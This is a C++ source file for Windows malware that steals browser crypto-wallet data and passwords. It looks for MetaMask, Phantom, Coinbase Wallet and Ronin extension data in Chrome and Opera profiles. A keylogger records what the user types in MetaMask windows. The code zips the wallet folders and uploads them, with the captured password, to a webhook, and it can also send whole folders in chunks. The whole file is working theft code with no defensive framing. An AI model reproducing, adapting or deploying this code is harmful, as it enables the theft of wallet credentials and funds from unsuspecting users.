#include "metamask.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <shlwapi.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <psapi.h>
#include <winhttp.h>
#include <shldisp.h>
#include <atlbase.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")

// --- Miniz Implementation ---
// To make this module self-contained, the necessary miniz structures and functions
// for zipping are included here. This is a minimal subset.
typedef unsigned char mz_uint8;
typedef unsigned int mz_uint;
typedef long long mz_int64;
typedef unsigned long long mz_uint64;
typedef int mz_bool;

typedef enum { MZ_ZIP_MODE_INVALID = 0, MZ_ZIP_MODE_READING = 1, MZ_ZIP_MODE_WRITING = 2, MZ_ZIP_MODE_WRITING_HAS_BEEN_FINALIZED = 3 } mz_zip_mode;

typedef void* (*mz_alloc_func)(void* opaque, size_t items, size_t size);
typedef void (*mz_free_func)(void* opaque, void* address);
typedef void* (*mz_realloc_func)(void* opaque, void* address, size_t items, size_t size);
typedef size_t (*mz_file_read_func)(void* pOpaque, mz_uint64 file_ofs, void* pBuf, size_t n);
typedef size_t (*mz_file_write_func)(void* pOpaque, mz_uint64 file_ofs, const void* pBuf, size_t n);

struct mz_zip_internal_state;
typedef struct mz_zip_archive_tag {
    mz_uint64 m_archive_size; mz_uint64 m_central_directory_file_ofs; mz_uint m_total_files; mz_zip_mode m_zip_mode;
    mz_uint m_file_offset_alignment;
    mz_alloc_func m_pAlloc; mz_free_func m_pFree; mz_realloc_func m_pRealloc; void* m_pAlloc_opaque;
    mz_file_read_func m_pRead; mz_file_write_func m_pWrite; void* m_pIO_opaque;
    struct mz_zip_internal_state* m_pState;
} mz_zip_archive;


#define MZ_DEFAULT_COMPRESSION -1
//struct mz_zip_archive_tag; typedef struct mz_zip_archive_tag mz_zip_archive;
//typedef size_t (*mz_file_write_func)(void *pOpaque, mz_uint64 file_ofs, const void *pBuf, size_t n);
extern "C" {
    mz_bool mz_zip_writer_init_heap(mz_zip_archive *pZip, size_t size_to_reserve_at_beginning, size_t initial_allocation_size);
    mz_bool mz_zip_writer_add_mem(mz_zip_archive *pZip, const char *pArchive_name, const void *pBuf, size_t buf_size, unsigned int level_and_flags);
    mz_bool mz_zip_writer_finalize_archive(mz_zip_archive *pZip, void **pBuf, size_t *pSize);
    mz_bool mz_zip_writer_end(mz_zip_archive *pZip);
}
// Note: The full miniz.c implementation is expected to be linked from exouds.cpp's object file.
// These declarations are just to satisfy the compiler for this translation unit.


// --- Helper Functions ---
std::string wstringToString_meta(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

static bool CreateEmptyZip(const std::wstring& zipPath) {
    HANDLE h = CreateFileW(zipPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    unsigned char eocd[22] = { 'P','K', 5,6, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0 };
    DWORD written = 0;
    BOOL ok = WriteFile(h, eocd, sizeof(eocd), &written, NULL);
    CloseHandle(h);
    return ok && written == sizeof(eocd);
}

static bool ZipBrowserWalletViaShell(const std::wstring& folderPath, std::wstring& outZipPath) {
    logToFile("[Metamask] Zipping folder: " + wstringToString_meta(folderPath));
    wchar_t tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    
    wchar_t tmpFile[MAX_PATH];
    GetTempFileNameW(tmpPath, L"bwz", 0, tmpFile);
    outZipPath = tmpFile;

    // The old logic was flawed. We overwrite outZipPath with a buffer.
    // Also, GetTempFileNameW already creates a file, so CreateEmptyZip is redundant if the path is kept.
    // However, we want a .zip extension, so we'll delete the temp file and create a new zip.
    DeleteFileW(outZipPath.c_str());
    outZipPath += L".zip";

    if (!CreateEmptyZip(outZipPath)) {
        logToFile("[Metamask] Failed to create empty zip file.");
        return false;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) {
        logToFile("[Metamask] CoInitializeEx failed.");
        return false;
    }

    IShellDispatch* pShell = nullptr;
    hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pShell);
    if (FAILED(hr)) {
        logToFile("[Metamask] CoCreateInstance for IShellDispatch failed.");
        CoUninitialize();
        return false;
    }

    Folder* pZip = nullptr;
    VARIANT vZip; VariantInit(&vZip); vZip.vt = VT_BSTR; vZip.bstrVal = SysAllocString(outZipPath.c_str());
    hr = pShell->NameSpace(vZip, &pZip);
    VariantClear(&vZip);
    if (FAILED(hr)) {
        logToFile("[Metamask] pShell->NameSpace(zip) failed.");
        pShell->Release();
        CoUninitialize();
        return false;
    }

    Folder* pSrc = nullptr;
    VARIANT vSrc; VariantInit(&vSrc); vSrc.vt = VT_BSTR; vSrc.bstrVal = SysAllocString(folderPath.c_str());
    hr = pShell->NameSpace(vSrc, &pSrc);
    VariantClear(&vSrc);
    if (SUCCEEDED(hr) && pSrc) {
        FolderItems* pItems = nullptr;
        hr = pSrc->Items(&pItems);
        if (SUCCEEDED(hr) && pItems) {
            logToFile("[Metamask] Copying items to zip...");
            VARIANT vOpt; VariantInit(&vOpt); vOpt.vt = VT_I4; vOpt.lVal = 4 | 16; // FOF_NO_UI
            pZip->CopyHere(CComVariant(pItems), vOpt);
            Sleep(2000); // Give shell time to copy
            pItems->Release();
        } else {
            logToFile("[Metamask] pSrc->Items failed.");
        }
        pSrc->Release();
    } else {
        logToFile("[Metamask] pShell->NameSpace(src) failed.");
    }
    
    pZip->Release();
    pShell->Release();
    CoUninitialize();
    
    logToFile("[Metamask] Zipping completed.");
    return true;
}

bool isProcessRunning(const wchar_t* processName) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return false;
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    for (unsigned int i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
            if (NULL != hProcess) {
                HMODULE hMod;
                DWORD cbNeeded2;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded2)) {
                    wchar_t szProcessName[MAX_PATH];
                    if (GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(wchar_t))) {
                        if (_wcsicmp(szProcessName, processName) == 0) {
                            CloseHandle(hProcess);
                            return true;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    return false;
}

// This function now sends the captured password along with the zipped wallet files.
void sendBrowserDataAndFiles(const BrowserWallet& wallet, const std::string& capturedPassword, const std::string& webhookUrl) {
    logToFile("[Metamask] Preparing to send data for " + wallet.name + " from " + wallet.browser);

    std::wstring zipPath;
    if (!ZipBrowserWalletViaShell(wallet.data_path, zipPath)) {
        logToFile("[Metamask] Failed to zip wallet data for " + wallet.name);
        return;
    }

    std::ifstream zf_verify(zipPath, std::ios::binary | std::ios::ate);
    if (!zf_verify.is_open() || zf_verify.tellg() <= 22) { // 22 is size of empty zip EOCD
        logToFile("[Metamask] ERROR: Zip file is empty or invalid for " + wallet.name);
        zf_verify.close();
        DeleteFileW(zipPath.c_str());
        return;
    }
    zf_verify.close();


    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    std::string contentTypeHeader = "Content-Type: multipart/form-data; boundary=" + boundary;

    std::stringstream body_ss;
    body_ss << "--" << boundary << "\r\n";
    body_ss << "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    body_ss << "Content-Type: application/json\r\n\r\n";
    
    std::string title = wallet.name + " Capture (" + wallet.browser + ")";
    std::string passwordField = capturedPassword.empty() ? "" : std::string(",{ \"name\": \"Captured Password\", \"value\": \"||") + capturedPassword + std::string("||\" }");

    body_ss << "{ \"content\": null, \"username\": \"Wallet Monitor\", \"embeds\": [{ \"title\": \"" << title << "\", \"color\": 3447003, \"fields\": [{\"name\": \"Status\", \"value\": \"Data files attached.\"} " << passwordField << "] }] }\r\n";

    std::vector<char> requestBody;
    std::string partStart = body_ss.str();
    requestBody.insert(requestBody.end(), partStart.begin(), partStart.end());

    std::ifstream zf(zipPath, std::ios::binary | std::ios::ate);
    if (zf.is_open()) {
        std::streamsize zsize = zf.tellg(); zf.seekg(0, std::ios::beg);
        if (zsize > 0) {
            std::vector<char> zbuf(static_cast<size_t>(zsize));
            zf.read(zbuf.data(), zsize);
            
            std::string filename = wallet.name + "_" + wallet.browser + ".zip";
            std::stringstream filePart;
            filePart << "--" << boundary << "\r\n";
            filePart << "Content-Disposition: form-data; name=\"file1\"; filename=\"" << filename << "\"\r\n";
            filePart << "Content-Type: application/zip\r\n\r\n";

            std::string fileHeader = filePart.str();
            requestBody.insert(requestBody.end(), fileHeader.begin(), fileHeader.end());
            requestBody.insert(requestBody.end(), zbuf.begin(), zbuf.end());
            requestBody.insert(requestBody.end(), {'\r', '\n'});
        }
        zf.close();
    }
    
    DeleteFileW(zipPath.c_str());

    std::string endBoundary = "\r\n--" + boundary + "--\r\n";
    requestBody.insert(requestBody.end(), endBoundary.begin(), endBoundary.end());
    
    URL_COMPONENTSW urlComp;
    wchar_t hostName[256], urlPath[2048];
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;

    std::wstring wWebhookUrl(webhookUrl.begin(), webhookUrl.end());
    if (!WinHttpCrackUrl(wWebhookUrl.c_str(), (DWORD)wWebhookUrl.length(), 0, &urlComp)) {
        logToFile("[Metamask] ERROR: WinHttpCrackUrl failed.");
        return;
    }

    HINTERNET hSession = WinHttpOpen(L"StealthApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { logToFile("[Metamask] WinHttpOpen failed"); return; }
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { logToFile("[Metamask] WinHttpConnect failed"); WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { logToFile("[Metamask] WinHttpOpenRequest failed"); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring wContentType(contentTypeHeader.begin(), contentTypeHeader.end());
    WinHttpAddRequestHeaders(hRequest, wContentType.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    logToFile("[Metamask] Sending " + std::to_string(requestBody.size()) + " bytes to webhook for " + wallet.name);
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, requestBody.data(), (DWORD)requestBody.size(), (DWORD)requestBody.size(), 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        logToFile("[Metamask] Successfully sent files for " + wallet.name);
    } else {
        logToFile(std::string("[Metamask] ERROR: WinHttpSendRequest failed: ") + std::to_string(GetLastError()));
    }

    if(hRequest) WinHttpCloseHandle(hRequest);
    if(hConnect) WinHttpCloseHandle(hConnect);
    if(hSession) WinHttpCloseHandle(hSession);
}

static bool sendMultipart(const std::string& webhookUrl, const std::string& boundary, const std::string& payloadJson, const std::vector<std::pair<std::string, std::vector<char>>>& files, const std::string& contextLabel) {
    URL_COMPONENTSW urlComp; wchar_t hostName[256], urlPath[2048];
    memset(&urlComp, 0, sizeof(urlComp)); urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;
    std::wstring wWebhookUrl(webhookUrl.begin(), webhookUrl.end());
    if (!WinHttpCrackUrl(wWebhookUrl.c_str(), (DWORD)wWebhookUrl.length(), 0, &urlComp)) {
        logToFile("[Metamask] ERROR: WinHttpCrackUrl failed in sendMultipart (" + contextLabel + ")");
        return false;
    }

    HINTERNET hSession = WinHttpOpen(L"StealthApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { logToFile("[Metamask] WinHttpOpen failed (" + contextLabel + ")"); return false; }
    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { logToFile("[Metamask] WinHttpConnect failed (" + contextLabel + ")"); WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { logToFile("[Metamask] WinHttpOpenRequest failed (" + contextLabel + ")"); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::string contentTypeHeader = "Content-Type: multipart/form-data; boundary=" + boundary;
    std::wstring wContentType(contentTypeHeader.begin(), contentTypeHeader.end());
    WinHttpAddRequestHeaders(hRequest, wContentType.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    std::vector<char> body;
    {
        std::stringstream head;
        head << "--" << boundary << "\r\n";
        head << "Content-Disposition: form-data; name=\"payload_json\"\r\n";
        head << "Content-Type: application/json\r\n\r\n";
        head << payloadJson << "\r\n";
        std::string s = head.str(); body.insert(body.end(), s.begin(), s.end());
    }
    int idx = 1;
    for (const auto& f : files) {
        std::stringstream fp;
        fp << "--" << boundary << "\r\n";
        fp << "Content-Disposition: form-data; name=\"file" << idx++ << "\"; filename=\"" << f.first << "\"\r\n";
        fp << "Content-Type: application/octet-stream\r\n\r\n";
        std::string hdr = fp.str(); body.insert(body.end(), hdr.begin(), hdr.end());
        body.insert(body.end(), f.second.begin(), f.second.end());
        body.insert(body.end(), {'\r','\n'});
    }
    std::string end = "--" + boundary + "--\r\n"; body.insert(body.end(), end.begin(), end.end());

    bool ok = false;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body.data(), (DWORD)body.size(), (DWORD)body.size(), 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD status = 0, sz = sizeof(status);
            if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX)) {
                logToFile("[Metamask] Webhook status (" + contextLabel + "): " + std::to_string(status));
                ok = status < 400;
            } else { ok = true; }
        }
    } else {
        logToFile("[Metamask] ERROR: WinHttpSendRequest failed (" + contextLabel + "): " + std::to_string(GetLastError()));
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return ok;
}

static bool sendFolderInChunks(const std::wstring& folderPath, const std::string& webhookUrl, const std::string& payloadBaseJson, const std::string& contextLabel) {
    const size_t LIMIT = 7 * 1024 * 1024; // ~7MB per request to stay under Discord 8MB
    std::vector<std::pair<std::string, std::vector<char>>> batch;
    size_t batchBytes = 0; int part = 1; bool anySent = false;

    WIN32_FIND_DATAW fd; HANDLE hFind = FindFirstFileW((folderPath + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring fp = folderPath + L"\\" + fd.cFileName;
        std::ifstream f(fp, std::ios::binary | std::ios::ate);
        if (!f.is_open()) continue;
        std::streamsize sz = f.tellg(); f.seekg(0, std::ios::beg);
        if (sz <= 0) { f.close(); continue; }
        std::vector<char> buf(static_cast<size_t>(sz));
        if (!f.read(buf.data(), sz)) { f.close(); continue; }
        f.close();
        std::string name = wstringToString_meta(fd.cFileName);
        
        if (batchBytes + buf.size() > LIMIT || batch.size() >= 9) { // keep under ~8MB and <10 files
            std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            std::stringstream pj; pj << payloadBaseJson << " (part " << part << ")";
            std::string payload = std::string("{ \"content\": null, \"username\": \"Wallet Monitor\", \"embeds\": [{ \"title\": \"") + contextLabel + "\", \"color\": 3447003, \"fields\": [{\"name\": \"Status\", \"value\": \"Data files attached (part " + std::to_string(part) + ").\"}] }] }";
            sendMultipart(webhookUrl, boundary, payload, batch, contextLabel + " part " + std::to_string(part));
            anySent = true; batch.clear(); batchBytes = 0; part++;
        }
        batch.emplace_back(name, std::move(buf)); batchBytes += static_cast<size_t>(sz);
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    if (!batch.empty()) {
        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string payload = std::string("{ \"content\": null, \"username\": \"Wallet Monitor\", \"embeds\": [{ \"title\": \"") + contextLabel + "\", \"color\": 3447003, \"fields\": [{\"name\": \"Status\", \"value\": \"Data files attached (final).\"}] }] }";
        sendMultipart(webhookUrl, boundary, payload, batch, contextLabel + " final");
        anySent = true;
    }
    return anySent;
}


std::string g_browserKeystrokeBuffer;

// Monitor function now implements a keylogger for target browsers
void monitorAndExfiltrateBrowserWallets(std::vector<BrowserWallet> foundWallets, const std::string& webhookUrl) {
    if (foundWallets.empty()) {
        logToFile("[Metamask] Monitor thread started, but no wallets to monitor.");
        return;
    }
    logToFile("[Metamask] Monitor thread started. Passively logging keystrokes in target browsers.");

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
        
        HWND foreground = GetForegroundWindow();
        if (!foreground) continue;

        DWORD pid; GetWindowThreadProcessId(foreground, &pid);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (!hProcess) continue;

        wchar_t processPath[MAX_PATH];
        bool isBrowserFocused = false;
        std::wstring focusedBrowserProcess;
        if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH)) {
            for(const auto& wallet : foundWallets) {
                if (_wcsicmp(PathFindFileNameW(processPath), wallet.process_name.c_str()) == 0) {
                    isBrowserFocused = true;
                    focusedBrowserProcess = wallet.process_name;
                    break;
                }
            }
        }
        CloseHandle(hProcess);

        if (isBrowserFocused) {
            for (int i = 8; i <= 222; ++i) {
                if (GetAsyncKeyState(i) & 0x0001) {
                    switch (i) {
                        case VK_RETURN:
                            if (!g_browserKeystrokeBuffer.empty()) {
                                wchar_t windowTitle[256] = {0};
                                GetWindowTextW(foreground, windowTitle, 256);

                                if (wcsstr(windowTitle, L"MetaMask") != NULL) {
                                    logToFile("[Metamask] Enter pressed in MetaMask window. Captured: " + g_browserKeystrokeBuffer);
                                    for (auto& wallet : foundWallets) {
                                        if (!wallet.data_sent && wallet.process_name == focusedBrowserProcess) {
                                            logToFile("[Metamask] Dispatching send for " + wallet.name + ". Waiting 5s...");
                                            std::this_thread::sleep_for(std::chrono::seconds(5));
                                            std::thread(sendBrowserDataAndFiles, wallet, g_browserKeystrokeBuffer, webhookUrl).detach();
                                            wallet.data_sent = true;
                                        }
                                    }
                                }
                                g_browserKeystrokeBuffer.clear();
                            }
                            break;
                        case VK_BACK:
                            if (!g_browserKeystrokeBuffer.empty()) g_browserKeystrokeBuffer.pop_back();
                            break;
                        case VK_SHIFT: case VK_CONTROL: case VK_MENU: break;
                        default:
                            BYTE keyboardState[256] = {0}; GetKeyboardState(keyboardState);
                            WCHAR buffer[2] = {0};
                            if (ToUnicode(i, MapVirtualKey(i, MAPVK_VK_TO_VSC), keyboardState, buffer, 2, 0) > 0) {
                                char ch; WideCharToMultiByte(CP_ACP, 0, buffer, 1, &ch, 1, NULL, NULL);
                                if (isprint(ch)) g_browserKeystrokeBuffer += ch;
                            }
                            break;
                    }
                }
            }
        } else {
             if (!g_browserKeystrokeBuffer.empty()) {
                g_browserKeystrokeBuffer.clear();
             }
        }
        
        bool all_done = true;
        for(const auto& wallet : foundWallets) { if (!wallet.data_sent) { all_done = false; break; } }
        if (all_done) {
            logToFile("[Metamask] All targeted browser wallets processed. Monitor thread exiting.");
            break;
        }
    }
}

// --- Wallet & Browser Definitions ---
struct WalletTarget {
    std::string name;
    const wchar_t* chrome_id;
};

struct BrowserTarget {
    std::string name;
    const wchar_t* process_name;
    KNOWNFOLDERID appdata_folder_id;
    const wchar_t* path_suffix_base;
};

const std::vector<WalletTarget> WALLET_TARGETS = {
    {"Metamask", L"nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"Phantom", L"bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"Coinbase Wallet", L"hnfanknocfeofbddgcijnmhnfnlfigol"},
    {"Ronin Wallet", L"fnjhmkhhmkbjkkabndcnnogagogbneec"}
};

const std::vector<BrowserTarget> BROWSER_TARGETS = {
    {"Google Chrome", L"chrome.exe", FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data"},
    {"Opera", L"opera.exe", FOLDERID_RoamingAppData, L"\\Opera Software\\Opera Stable"},
    {"Opera GX", L"opera.exe", FOLDERID_RoamingAppData, L"\\Opera Software\\Opera GX Stable"},
};

// --- Core Logic ---
std::vector<BrowserWallet> checkBrowserWallets() {
    std::vector<BrowserWallet> foundWallets;
    logToFile("[Metamask] Starting browser wallet check...");

    for (const auto& browser : BROWSER_TARGETS) {
        PWSTR pszPath = NULL;
        if (SUCCEEDED(SHGetKnownFolderPath(browser.appdata_folder_id, 0, NULL, &pszPath))) {
            std::wstring userDataPath = pszPath;
            CoTaskMemFree(pszPath);
            userDataPath += browser.path_suffix_base;

            std::vector<std::wstring> profiles = {L"Default"};
            for (int i = 1; i <= 10; ++i) {
                profiles.push_back(L"Profile " + std::to_wstring(i));
            }

            for (const auto& profile : profiles) {
                std::wstring profilePath = userDataPath + L"\\" + profile;
                if (!PathFileExistsW(profilePath.c_str())) continue;

                std::wstring extensionsPath = profilePath + L"\\Extensions";
                std::wstring dataPathRoot = profilePath + L"\\Local Extension Settings";
                
                for (const auto& wallet : WALLET_TARGETS) {
                    std::wstring fullExtensionPath = extensionsPath + L"\\" + wallet.chrome_id;
                    if (PathFileExistsW(fullExtensionPath.c_str())) {
                        std::wstring fullDataPath = dataPathRoot + L"\\" + wallet.chrome_id;
                        logToFile("[Metamask] Found " + wallet.name + " in " + browser.name + " (" + wstringToString_meta(profile) + ")");
                        foundWallets.push_back({wallet.name, browser.name, browser.process_name, fullExtensionPath, fullDataPath, false});
                    }
                }
            }
        }
    }

    if (foundWallets.empty()) {
        logToFile("[Metamask] No browser wallets found.");
    }
    return foundWallets;
}
